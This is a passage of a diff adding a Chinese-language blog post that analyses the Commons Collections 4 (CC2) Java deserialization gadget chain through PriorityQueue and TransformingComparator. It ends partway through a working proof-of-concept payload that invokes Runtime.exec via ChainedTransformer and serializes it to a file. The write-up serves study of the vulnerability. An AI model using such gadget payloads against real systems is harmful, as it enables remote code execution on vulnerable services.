+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>以<code>banana</code>、<code>pear</code>、<code>apple</code>的顺序输入，但是输出却是<code>apple</code>、<code>banana</code>、<code>pear</code> <code>null</code>，这是因为从字符串的排序看，a&gt;b&gt;p。<br><img src="https://kingofkb.github.io/medias/image/20220829/priorityqueue.png"><br>因此，放入PriorityQueue的元素，必须实现Comparable接口，PriorityQueue会根据元素的排序顺序决定出队的优先级。<br>构造Comparable自定义排序算法如下</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>PriorityQueue<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Queue<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Comparator<span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">cc2</span> <span class="token punctuation">{</span>
+    <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">UserComparator</span> <span class="token keyword">implements</span> <span class="token class-name">Comparator</span><span class="token operator">&lt;</span>User<span class="token operator">></span> <span class="token punctuation">{</span>
+        <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">compare</span><span class="token punctuation">(</span>User u1<span class="token punctuation">,</span> User u2<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">if</span><span class="token punctuation">(</span>u1<span class="token punctuation">.</span>number<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">==</span>u2<span class="token punctuation">.</span>number<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">return</span> u1<span class="token punctuation">.</span>number<span class="token punctuation">.</span><span class="token function">compareTo</span><span class="token punctuation">(</span>u2<span class="token punctuation">.</span>number<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            <span class="token keyword">if</span><span class="token punctuation">(</span>u1<span class="token punctuation">.</span>number<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">'V'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+                <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+
+    <span class="token punctuation">}</span>
+    <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">{</span>
+        <span class="token keyword">public</span> <span class="token keyword">final</span> String name<span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token keyword">final</span> String number<span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token function">User</span><span class="token punctuation">(</span>String name<span class="token punctuation">,</span> String number<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token operator">=</span>name<span class="token punctuation">;</span>
+            <span class="token keyword">this</span><span class="token punctuation">.</span>number<span class="token operator">=</span>number<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">public</span> String <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">return</span> name<span class="token operator">+</span><span class="token string">"/"</span><span class="token operator">+</span>number<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        Queue<span class="token operator">&lt;</span>User<span class="token operator">></span> queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">UserComparator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        queue<span class="token punctuation">.</span><span class="token function">offer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token string">"banana"</span><span class="token punctuation">,</span> <span class="token string">"V1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        queue<span class="token punctuation">.</span><span class="token function">offer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token string">"pear"</span><span class="token punctuation">,</span> <span class="token string">"V2"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        queue<span class="token punctuation">.</span><span class="token function">offer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"A1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>queue<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>queue<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>queue<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>queue<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p><img src="https://kingofkb.github.io/medias/image/20220829/comparator.png"><br>我们需要对<code>PriorityQueue</code>利用点进行分析，直接进入它的<code>readObject</code>方法，可以看到最后调用<code>heapify</code>方法</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream s<span class="token punctuation">)</span>
+    <span class="token keyword">throws</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>
+    <span class="token comment" spellcheck="true">// Read in size, and any hidden stuff</span>
+    s<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment" spellcheck="true">// Read in (and discard) array length</span>
+    s<span class="token punctuation">.</span><span class="token function">readInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span>size<span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token comment" spellcheck="true">// Read in all elements.</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
+        queue<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment" spellcheck="true">// Elements are guaranteed to be in "proper order", but the</span>
+    <span class="token comment" spellcheck="true">// spec has never explained what that might be.</span>
+    <span class="token function">heapify</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>跟进heapify。</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">heapify</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token punctuation">(</span>size <span class="token operator">>>></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span>
+        <span class="token function">siftDown</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token punctuation">(</span>E<span class="token punctuation">)</span> queue<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>跟进siftDown</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">siftDown</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">,</span> E x<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>comparator <span class="token operator">!=</span> null<span class="token punctuation">)</span>
+        <span class="token function">siftDownUsingComparator</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">else</span>
+        <span class="token function">siftDownComparable</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>在<code>comparator</code>不为空时调用<code>siftDownUsingComparator</code>，在其为空时，调用<code>siftDownComparable</code>。<br>看<code>siftDownUsingComparator</code>。</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">siftDownUsingComparator</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">,</span> E x<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">int</span> half <span class="token operator">=</span> size <span class="token operator">>>></span> <span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token keyword">while</span> <span class="token punctuation">(</span>k <span class="token operator">&lt;</span> half<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">int</span> child <span class="token operator">=</span> <span class="token punctuation">(</span>k <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
+        Object c <span class="token operator">=</span> queue<span class="token punctuation">[</span>child<span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">int</span> right <span class="token operator">=</span> child <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>right <span class="token operator">&lt;</span> size <span class="token operator">&amp;&amp;</span> comparator<span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span><span class="token punctuation">(</span>E<span class="token punctuation">)</span> c<span class="token punctuation">,</span> <span class="token punctuation">(</span>E<span class="token punctuation">)</span> queue<span class="token punctuation">[</span>right<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>
+            c <span class="token operator">=</span> queue<span class="token punctuation">[</span>child <span class="token operator">=</span> right<span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>comparator<span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token punctuation">(</span>E<span class="token punctuation">)</span> c<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span>
+            <span class="token keyword">break</span><span class="token punctuation">;</span>
+        queue<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> c<span class="token punctuation">;</span>
+        k <span class="token operator">=</span> child<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    queue<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>小补充一下知识点</p>
+<pre class=" language-1"><code class="language-1"><< 左移运算符，size << 1,相当于size乘以2
+>> 右移运算符，size >> 1,相当于size除以2
+>>> 无符号右移，忽略符号位，空位都以0补齐
+</code></pre>
+<p><code>siftDownUsingComparator</code>会调<code> comparator</code>的<code>compare()</code>方法来进行优先级的比较和排序。这样，反序列化之后的优先级队列，也拥有了顺序。</p>
+<h3 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h3><p>根据名字我们可以将这个理解为和TransformMap应该具有相同功能，上面对PriorityQueue的学习知道它会根据comparator进行一个优先级排序，那么这个就是来创建comparator的，我们可以将comparator中加入恶意代码进行命令执行即可。</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TransformingComparator</span><span class="token operator">&lt;</span>I<span class="token punctuation">,</span> O<span class="token operator">></span> <span class="token keyword">implements</span> <span class="token class-name">Comparator</span><span class="token operator">&lt;</span>I<span class="token operator">></span><span class="token punctuation">,</span> Serializable <span class="token punctuation">{</span>
+    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> 3456940356043606220L<span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token keyword">final</span> Comparator<span class="token operator">&lt;</span>O<span class="token operator">></span> decorated<span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token keyword">final</span> Transformer<span class="token operator">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> I<span class="token punctuation">,</span> <span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">O</span><span class="token operator">></span> transformer<span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token function">TransformingComparator</span><span class="token punctuation">(</span>Transformer<span class="token operator">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> I<span class="token punctuation">,</span> <span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">O</span><span class="token operator">></span> transformer<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">this</span><span class="token punctuation">(</span>transformer<span class="token punctuation">,</span> ComparatorUtils<span class="token punctuation">.</span>NATURAL_COMPARATOR<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token function">TransformingComparator</span><span class="token punctuation">(</span>Transformer<span class="token operator">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> I<span class="token punctuation">,</span> <span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">O</span><span class="token operator">></span> transformer<span class="token punctuation">,</span> Comparator<span class="token operator">&lt;</span>O<span class="token operator">></span> decorated<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>decorated <span class="token operator">=</span> decorated<span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>transformer <span class="token operator">=</span> transformer<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">compare</span><span class="token punctuation">(</span>I obj1<span class="token punctuation">,</span> I obj2<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        O value1 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>transformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>obj1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        O value2 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>transformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>obj2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>decorated<span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span>value1<span class="token punctuation">,</span> value2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">int</span> total <span class="token operator">=</span> <span class="token number">17</span><span class="token punctuation">;</span>
+        <span class="token keyword">int</span> total <span class="token operator">=</span> total <span class="token operator">*</span> <span class="token number">37</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>decorated <span class="token operator">==</span> null <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>decorated<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        total <span class="token operator">=</span> total <span class="token operator">*</span> <span class="token number">37</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>transformer <span class="token operator">==</span> null <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>transformer<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> total<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">equals</span><span class="token punctuation">(</span>Object object<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span> <span class="token operator">==</span> object<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>null <span class="token operator">==</span> object<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>object<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            TransformingComparator<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span> <span class="token operator">?</span><span class="token operator">></span> comp <span class="token operator">=</span> <span class="token punctuation">(</span>TransformingComparator<span class="token punctuation">)</span>object<span class="token punctuation">;</span>
+            <span class="token keyword">return</span> null <span class="token operator">==</span> <span class="token keyword">this</span><span class="token punctuation">.</span>decorated <span class="token operator">?</span> null <span class="token operator">==</span> comp<span class="token punctuation">.</span>decorated <span class="token operator">:</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>decorated<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>comp<span class="token punctuation">.</span>decorated<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> null <span class="token operator">==</span> <span class="token keyword">this</span><span class="token punctuation">.</span>transformer <span class="token operator">?</span> null <span class="token operator">==</span> comp<span class="token punctuation">.</span>transformer <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>transformer<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>comp<span class="token punctuation">.</span>transformer<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>可以看一下他的定义，在compare函数里会执行transform方法，那么就可以执行恶意代码了。</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">compare</span><span class="token punctuation">(</span>I obj1<span class="token punctuation">,</span> I obj2<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    O value1 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>transformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>obj1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    O value2 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>transformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>obj2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>decorated<span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span>value1<span class="token punctuation">,</span> value2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<h3 id="poc分析"><a href="#poc分析" class="headerlink" title="poc分析"></a>poc分析</h3><h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p>类似commons colletions1，直接让Transformer为ChainedTransformer就ok。<br>找到的这种方法的payload。</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>Transformer<span class="token punctuation">;</span>
+<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>comparators<span class="token punctuation">.</span>TransformingComparator<span class="token punctuation">;</span>
+<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ChainedTransformer<span class="token punctuation">;</span>
+<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ConstantTransformer<span class="token punctuation">;</span>
+<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>InvokerTransformer<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>PriorityQueue<span class="token punctuation">;</span>
+
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">cc2</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> ClassNotFoundException<span class="token punctuation">,</span> NoSuchFieldException<span class="token punctuation">,</span> IllegalAccessException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>
+        Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>
+                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>null<span class="token punctuation">,</span> null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+        <span class="token punctuation">}</span><span class="token punctuation">;</span>
+        ChainedTransformer chain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        TransformingComparator comparator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TransformingComparator</span><span class="token punctuation">(</span>chain<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        PriorityQueue<span class="token operator">&lt;</span>String<span class="token operator">></span> queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+        Class <span class="token class-name">name</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.util.PriorityQueue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Field field <span class="token operator">=</span> name<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"comparator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>queue<span class="token punctuation">,</span>comparator<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+        ObjectOutputStream objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"1.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
